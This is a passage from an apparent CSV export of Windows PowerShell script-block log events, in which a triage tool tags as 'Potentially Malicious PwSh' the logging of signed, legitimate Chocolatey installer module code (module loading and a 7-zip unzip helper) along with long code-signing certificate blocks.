mCqQdlL3sr1tKO0JGxndzqRPhk3doLiL4FyKlRs6F91d9tggZgwcVsPYLSAk9/84 # wbxqv2j/KzCY6uq0uuHUsYKTuCXn2cyYqB1Iu9GCj6szi3F8KlzlNEE6EPtVYHY6 # U4pxNhGijHdAMuMtaSuK+6ZYrICOdwPTbozno88gE1GV1nPgGmVr2mxN8fwExzd8 # 7tyNCSUJg9DaM9Jw4f3zPE64PaY2V+dqZW8bHn9U0sHS8HkTEwFki4j+pg91Tdxq # A4xJiCcSSTW60n7N2tSs7VNaDxtBVK6FX48t0jMCazDRpMgfKXm7wGlvkw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\chocolateyInstaller.psm1 ¦ ScriptBlockId: 2198d694-09b8-4f62-851c-f6c39412a615 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. $helpersPath = (Split-Path -parent $MyInvocation.MyCommand.Definition); $global:DebugPreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentDebug -eq 'true') { $global:DebugPreference = ""Continue""; } $global:VerbosePreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentVerbose -eq 'true') { $global:VerbosePreference = ""Continue""; $verbosity = $true } $installArguments = $env:chocolateyInstallArguments $overrideArgs = $false if ($env:chocolateyInstallOverride -eq 'true') { $overrideArgs = $true } $forceX86 = $false if ($env:chocolateyForceX86 -eq 'true') { $forceX86 = $true } $packageParameters = $env:chocolateyPackageParameters # ensure module loading preference is on $PSModuleAutoLoadingPreference = ""All""; Write-Debug ""Host version is $($host.Version), PowerShell Version is '$($PSVersionTable.PSVersion)' and CLR Version is '$($PSVersionTable.CLRVersion)'."" # grab functions from files Get-Item $helpersPath\functions\*.ps1 | ? { -not ($_.Name.Contains("".Tests."")) } | % { . $_.FullName; #Export-ModuleMember -Function $_.BaseName } # Export built-in functions prior to loading extensions so that # extension-specific loading behavior can be used based on built-in # functions. This allows those overrides to be much more deterministic # This behavior was broken from v0.9.9.5 - v0.10.3. Export-ModuleMember -Function * -Alias * -Cmdlet * $currentAssemblies = [System.AppDomain]::CurrentDomain.GetAssemblies() # load extensions if they exist $extensionsPath = Join-Path ""$helpersPath"" '..\extensions' if (Test-Path($extensionsPath)) { Write-Debug 'Loading community extensions' Get-ChildItem $extensionsPath -recurse -filter ""*.dll"" | Select -ExpandProperty FullName | % { $path = $_; if ($path.Contains(""extensions\chocolatey\lib-synced"")) { continue } try { Write-Debug ""Importing '$path'""; $fileNameWithoutExtension = $([System.IO.Path]::GetFileNameWithoutExtension($path)) Write-Debug ""Loading '$fileNameWithoutExtension' extension.""; $loaded = $false $currentAssemblies | % { $name = $_.GetName().Name if ($name -eq $fileNameWithoutExtension) { Import-Module $_ $loaded = $true } } if (!$loaded) { Import-Module $path; } } catch { if ($env:ChocolateyPowerShellHost -eq 'true') { Write-Warning ""Import failed for '$path'. Error: '$_'"" } else { Write-Warning ""Import failed for '$path'. If it depends on a newer version of the .NET framework, please make sure you are using the built-in PowerShell Host. Error: '$_'"" } } } #Resolve-Path $extensionsPath\**\*\*.psm1 | % { Write-Debug ""Importing `'$_`'""; Import-Module $_.ProviderPath } Get-ChildItem $extensionsPath -recurse -filter ""*.psm1"" | Select -ExpandProperty FullName | % { Write-Debug ""Importing `'$_`'""; Import-Module $_; } } # todo: explore removing this for a future version Export-ModuleMember -Function * -Alias * -Cmdlet * # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCBpXDGe+ALqwCJ # YsrRVbudLVLfjC+vZjhGFqLdiSXpYaCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgwmHjAcUy+iE+dyiIfi2zB5dbGJZWd7DUt/no # Ll1cr0gwDQYJKoZIhvcNAQEBBQAEggEARX58JVHLurcXQTf7fttDVIUmw5vuH+lD # raYqEYC1l92+ucU8i5J015Gv8jVcDC4gXcE4hijQ6rryX4ikBymH/qmVWLrIA4NU # a2aYYcq26oWCODgd9NOPoPvBNLg6wZNCR+BNpZ7EQ92mY4+hR6SO2lmap2D/MHCQ # FrQ6UIbfUTTHZ6KuJn8hEMizgb9w7n9uwzqh4KkA0mp/MJEIGTQIuIQTZvNs/oZQ # yTqOyO1DTHfTUs3PrvsPyTQam8k2c1z9MftLTeeAsTEScGa0/wu0HPTBdlXPVN3R # AmPtXHvT64I/IDN9FQ+NV6OdHrlOitGteeh+B6qDkoF3zr9UGzrdpaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAzWjAjBgkqhkiG9w0BCQQxFgQUReNlyfyc12kJ8VKD # f/nnmCJJFB4wDQYJKoZIhvcNAQEBBQAEggEAbahPWSbk7P/cx1sVMWPwsMH7tEIi # mCqQdlL3sr1tKO0JGxndzqRPhk3doLiL4FyKlRs6F91d9tggZgwcVsPYLSAk9/84 # wbxqv2j/KzCY6uq0uuHUsYKTuCXn2cyYqB1Iu9GCj6szi3F8KlzlNEE6EPtVYHY6 # U4pxNhGijHdAMuMtaSuK+6ZYrICOdwPTbozno88gE1GV1nPgGmVr2mxN8fwExzd8 # 7tyNCSUJg9DaM9Jw4f3zPE64PaY2V+dqZW8bHn9U0sHS8HkTEwFki4j+pg91Tdxq # A4xJiCcSSTW60n7N2tSs7VNaDxtBVK6FX48t0jMCazDRpMgfKXm7wGlvkw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:48.999 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,82,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = 